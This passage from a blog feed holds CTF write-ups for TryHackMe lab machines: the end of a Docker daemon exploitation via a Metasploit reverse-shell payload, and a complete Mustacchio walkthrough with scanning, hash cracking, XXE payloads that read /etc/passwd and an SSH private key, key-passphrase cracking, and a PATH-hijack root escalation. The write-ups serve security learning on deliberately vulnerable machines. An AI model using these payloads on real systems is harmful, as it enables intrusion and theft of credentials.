msf6 exploit(linux/http/docker_daemon_tcp) &amp;gt; set lhost tun0
lhost =&amp;gt; tun0
msf6 exploit(linux/http/docker_daemon_tcp) &amp;gt; show options

Module options (exploit/linux/http/docker_daemon_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   CONTAINER_ID                   no        container id you would like
   DOCKERIMAGE   alpine:latest    yes       hub.docker.com image to use
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        localhost        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
   RPORT         2375             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                          no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux x64


msf6 exploit(linux/http/docker_daemon_tcp) &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now I just run the exploit and get a shell.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;msf6 exploit(linux/http/docker_daemon_tcp) &amp;gt; exploit
[*] Exploiting target {:address=&amp;gt;&quot;0.0.0.1&quot;, :hostname=&amp;gt;&quot;localhost&quot;}

[*] Started reverse TCP handler on &amp;lt;Machine IP&amp;gt;:4444 
[-] Failed to connect to the target
[-] Exploit aborted due to failure: unknown: Failed to connect to the target
[*] Exploiting target {:address=&amp;gt;&quot;127.0.0.1&quot;, :hostname=&amp;gt;&quot;localhost&quot;}
[*] Started reverse TCP handler on &amp;lt;Machine IP&amp;gt;:4444 
[*] The docker container is created, waiting for deploy
[*] Waiting for the cron job to run, can take up to 60 seconds
[*] Sending stage (3012548 bytes) to 10.10.59.151
[+] Deleted /etc/cron.d/GOKzWbNu
[+] Deleted /tmp/nCJrYRbW
[*] Meterpreter session 1 opened (&amp;lt;Machine IP&amp;gt;:4444 -&amp;gt; 10.10.59.151:41406) at 2021-08-13 16:39:05 +0100
[*] Session 1 created in the background.
msf6 exploit(linux/http/docker_daemon_tcp) &amp;gt; sessions 1
[*] Starting interaction with 1...

meterpreter &amp;gt; shell
Process 18578 created.
Channel 1 created.
whoami
root
ls -lah /root/root.txt
-rw-r--r-- 1 root root 26 Dec 18  2020 /root/root.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;p&gt;============================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="tryhackme" />
      
        <category term="ctf" />
      
        <category term="easy" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">Mustacchio Write Up</title>
      <link href="https://darrynbrownfield.co.uk/mustacchio" rel="alternate" type="text/html" title="Mustacchio Write Up" />
      <published>2021-08-12T00:00:00+00:00</published>
      <updated>2021-08-12T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/mustacchio</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/mustacchio">&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/mustacchio&quot;&gt;mustacchio&lt;/a&gt; is a easy rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://tryhackme.com/p/zyeinn&quot;&gt;zyeinn&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;Although not required I added the machine IP to my host file so through out the write up I can use mustacchio.thm for consistency. Once added I started a nmap scan to check for available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial mustacchio.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-12 11:04 BST
Nmap scan report for mustacchio.thm (10.10.41.138)
Host is up (0.031s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2 Ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;22 - SSH - OpenSSH 7.2p2&lt;/li&gt;
  &lt;li&gt;80 - HTTP - Apache 2.4.18&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I also ran a full port scan and found 1 additional port:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nmap -p- -oA nmap/full mustacchio.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-12 11:07 BST
Nmap scan report for mustacchio.thm (10.10.41.138)
Host is up (0.032s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8765/tcp open  ultraseek-http

Nmap done: 1 IP address (1 host up) scanned in 119.61 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;I started with port 80 and was presented with a very basic web page, there isnt really any functionally on the pages.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/index.png&quot; alt=&quot;index&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I ran a gobuster to check for other directories.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://mustacchio.thm -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -t 75
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://mustacchio.thm
[+] Threads:        75
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/08/12 11:11:22 Starting gobuster
===============================================================
/images (Status: 301)
/fonts (Status: 301)
/custom (Status: 301)
/server-status (Status: 403)
===============================================================
2021/08/12 11:11:34 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;/custom could be interesting.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/custom.png&quot; alt=&quot;custom&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking in the js folder I found a file called users.bak, I downloaded the file to my machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/usersbak.png&quot; alt=&quot;usersbak&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Its a SQLite database.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $file users.bak 
users.bak: SQLite 3.x database, last written using SQLite version 3034001
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The database has one table called users with one record which is the username ‘admin’ and a hashed password which ive redacted from the output.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sqlite3 users.bak
SQLite version 3.31.1 2020-01-27 19:55:54
Enter &quot;.help&quot; for usage hints.
sqlite&amp;gt; .tables
users
sqlite&amp;gt; select * from users;
admin|&amp;lt;REDACTED&amp;gt;
sqlite&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The hash is SHA1, a great tool to use to identify hashes is hash-identifier.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $hash-identifier                                                       
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: &amp;lt;REDACTED&amp;gt;

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I put the hash in a file called ‘hash’ and then used hashcat to crack it with the command &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcat -m 100 hash /usr/share/wordlists/rockyou.txt --force&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The hash cracked within a few seconds, I looked around the webpage to find somewhere I could use the credentials but couldn’t find anything.&lt;/p&gt;

&lt;p&gt;I turned my attention to the other port 8765 and got an admin panel.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I logged in with the credentials and was presented with a page to add a comment.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/comment.png&quot; alt=&quot;comment&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the source code, 3 things jumped out.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/source.png&quot; alt=&quot;source&quot; /&gt;&lt;/p&gt;

&lt;p&gt;1) Another backup file is referenced&lt;/p&gt;

&lt;p&gt;2) A username of Barry and a breadcumb to grab an SSH key if possible&lt;/p&gt;

&lt;p&gt;3) A reference to XML being used&lt;/p&gt;

&lt;p&gt;Clicking submit without any input presents an alert ‘Insert XML Code!’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/insertcode.png&quot; alt=&quot;insertcode&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I downloaded the dontforget.bak file by browsing to: http://mustacchio.thm:8765/auth/dontforget.bak&lt;/p&gt;

&lt;p&gt;Looking at the file its an XML example.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat dontforget.bak 
&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;comment&amp;gt;
  &amp;lt;name&amp;gt;Joe Hamd&amp;lt;/name&amp;gt;
  &amp;lt;author&amp;gt;Barry Clad&amp;lt;/author&amp;gt;
  &amp;lt;com&amp;gt;his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessl
y and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now sin
ce this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playin
g with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that
 you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.&amp;lt;/com&amp;gt;
&amp;lt;/comment&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I tried the example on the webpage and got the expected result.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/test.png&quot; alt=&quot;test&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;It appears the next step is to use XML External Entiry (XXE) to grab barry’s SSH key to allow us to connect to the machine. Learning XXE is very much on my to do list so I went over to &lt;a href=&quot;https://portswigger.net/web-security/xxe&quot;&gt;port swigger academy&lt;/a&gt; which has a great training resource and found the following payload:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&amp;gt; ]&amp;gt;
&amp;lt;stockCheck&amp;gt;&amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt;&amp;lt;/stockCheck&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using the original example and the payload above I created my own payload to test XXE.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&amp;gt; ]&amp;gt;
&amp;lt;comment&amp;gt;
  &amp;lt;name&amp;gt;Daz&amp;lt;/name&amp;gt;
  &amp;lt;author&amp;gt;Please work...&amp;lt;/author&amp;gt;
  &amp;lt;com&amp;gt;&amp;amp;xxe;&amp;lt;/com&amp;gt;
&amp;lt;/comment&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It worked!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/testworked.png&quot; alt=&quot;testworked&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tweaked the payload to grab barrys SSH key.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;file:///home/barry/.ssh/id_rsa&quot;&amp;gt; ]&amp;gt;
&amp;lt;comment&amp;gt;
  &amp;lt;name&amp;gt;Daz&amp;lt;/name&amp;gt;
  &amp;lt;author&amp;gt;Please work...&amp;lt;/author&amp;gt;
  &amp;lt;com&amp;gt;&amp;amp;xxe;&amp;lt;/com&amp;gt;
&amp;lt;/comment&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Again this worked, however looking at the key it is encrypted so before I can use it to login I need to crack it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;  GNU nano 4.9.2                                       
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E
&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I used ssh2john to generate a hash and saved it to a file called keyhash.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $/usr/share/john/ssh2john.py key &amp;gt; keyhash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then using john and the rockyou wordlist I was able to get the keys password.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $john keyhash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
&amp;lt;redacted&amp;gt;       (key)
1g 0:00:00:05 DONE (2021-08-12 11:30) 0.1779g/s 2551Kp/s 2551Kc/s 2551KC/sa6_123..*7¡Vamos!
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To use the key I used chmod 600 and was able to login.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $chmod 600 key
┌─[daz@parrot]─[~/Documents/TryHackMe/Mustacchio]
└──╼ $ssh -i key barry@mustacchio.thm
Enter passphrase for key 'key': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
16 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Thu Aug 12 10:31:58 2021 from 10.8.21.217
barry@mustacchio:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;While enumerating the machine I found another user directory. Within this directory was a ELF file owned by root but executable by all.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;barry@mustacchio:~$ cd /home/joe/
barry@mustacchio:/home/joe$ ls
live_log
barry@mustacchio:/home/joe$ file live_log 
live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a455189
64ad12abe, for GNU/Linux 3.2.0, not stripped
barry@mustacchio:/home/joe$ ls -lah live_log 
-rwsr-xr-x 1 root root 17K Jun 12 15:48 live_log
barry@mustacchio:/home/joe$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running the file it appears to just be reading the HTTP access logs for port 8765.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;barry@mustacchio:/home/joe$ ./live_log 
10.8.21.217 - - [12/Aug/2021:10:20:02 +0000] &quot;GET /home.php HTTP/1.1&quot; 200 1077 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0&quot;
10.8.21.217 - - [12/Aug/2021:10:20:27 +0000] &quot;POST /home.php HTTP/1.1&quot; 200 1077 &quot;http://mustacchio.thm:8765/home.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
x/68.0&quot;
10.8.21.217 - - [12/Aug/2021:10:21:00 +0000] &quot;POST /home.php HTTP/1.1&quot; 200 1123 &quot;http://mustacchio.thm:8765/home.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
x/68.0&quot;
10.8.21.217 - - [12/Aug/2021:10:23:47 +0000] &quot;GET /auth/dontforget.bak HTTP/1.1&quot; 200 996 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0&quot;
10.8.21.217 - - [12/Aug/2021:10:25:24 +0000] &quot;POST /home.php HTTP/1.1&quot; 200 1123 &quot;http://mustacchio.thm:8765/home.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
x/68.0&quot;
10.8.21.217 - - [12/Aug/2021:10:25:25 +0000] &quot;POST /home.php HTTP/1.1&quot; 200 1563 &quot;http://mustacchio.thm:8765/home.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
x/68.0&quot;
10.8.21.217 - - [12/Aug/2021:10:26:37 +0000] &quot;GET /home.php HTTP/1.1&quot; 200 1077 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0&quot;
10.8.21.217 - - [12/Aug/2021:10:27:01 +0000] &quot;POST /home.php HTTP/1.1&quot; 200 1782 &quot;http://mustacchio.thm:8765/home.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
x/68.0&quot;
10.8.21.217 - - [12/Aug/2021:10:27:39 +0000] &quot;GET /home.php HTTP/1.1&quot; 200 1077 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0&quot;
10.8.21.217 - - [12/Aug/2021:10:28:20 +0000] &quot;POST /home.php HTTP/1.1&quot; 200 2573 &quot;http://mustacchio.thm:8765/home.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
x/68.0&quot;
^CLive Nginx Log Readerbarry@mustacchio:/home/joe$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I used strings to look at the file and found the line:&lt;/p&gt;

&lt;p&gt;tail -f /var/log/nginx/access.log&lt;/p&gt;

&lt;p&gt;Because the tail command is not using an absolute path, we should be able to get privilege escalation by using the PATH variable. Raj Chandel has a great &lt;a href=&quot;https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/&quot;&gt;blog&lt;/a&gt; about this technique.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;barry@mustacchio:/home/joe$ 
barry@mustacchio:/home/joe$ cd /tmp
barry@mustacchio:/tmp$ echo &quot;/bin/bash&quot; &amp;gt; tail
barry@mustacchio:/tmp$ chmod +x tail 
barry@mustacchio:/tmp$ export PATH=/tmp:$PATH
barry@mustacchio:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
barry@mustacchio:/tmp$ /home/joe/live_log 
root@mustacchio:/tmp# whoami
root
root@mustacchio:/tmp# 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;p&gt;============================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="tryhackme" />
      
        <category term="ctf" />
      
        <category term="easy" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
</feed>
